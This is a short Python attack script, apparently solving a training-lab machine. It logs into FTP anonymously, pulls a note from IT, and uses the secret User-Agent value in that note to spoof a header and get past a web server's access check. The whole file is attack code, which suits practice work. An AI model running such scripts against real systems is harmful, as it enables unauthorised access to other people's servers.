import ftplib
import requests
import sys

# TARGET CONFIG
TARGET_IP = "10.129.233.197"  # <--- REPLACE with your current Lab IP
FTP_USER = "anonymous"
FTP_PASS = "anonymous"

print(f"[*] Targeting: {TARGET_IP}")

# STEP 1: FTP EXTRACTION
print("[*] Connecting to FTP...")
try:
    ftp = ftplib.FTP(TARGET_IP)
    ftp.login(FTP_USER, FTP_PASS)
    
    # List files to confirm (optional, good for debugging)
    # ftp.dir() 
    
    print("[*] Downloading Note-From-IT.txt...")
    with open("local_note.txt", "wb") as f:
        ftp.retrbinary("RETR Note-From-IT.txt", f.write)
    
    ftp.quit()
    print("[+] FTP Download Complete.")

except Exception as e:
    print(f"[-] FTP Failed: {e}")
    sys.exit()

# STEP 2: PARSING THE SECRET
print("[*] Reading the secret note...")
user_agent_secret = ""

with open("local_note.txt", "r") as f:
    content = f.read()
    # We know the note says "User-Agent: Server Administrator"
    # Let's extract exactly what we need. 
    # In a real exploit, you might use Regex here.
    if "Server Administrator" in content:
        user_agent_secret = "Server Administrator"
        print(f"[+] Found Secret User-Agent: '{user_agent_secret}'")
    else:
        print("[-] Could not find the secret in the note!")
        sys.exit()

# STEP 3: HTTP EXPLOIT
print("[*] Launching HTTP Attack...")
url = f"http://{TARGET_IP}"
headers = {
    'User-Agent': user_agent_secret  # <--- The spoofed header
}

try:
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        print("\n[SUCCESS] Server Cracked! Here is the response:\n")
        print("="*40)
        print(response.text[:300]) # Print first 300 chars to prove access
        print("="*40)
    else:
        print(f"[-] Failed. Status Code: {response.status_code}")

except Exception as e:
    print(f"[-] HTTP Request Failed: {e}")
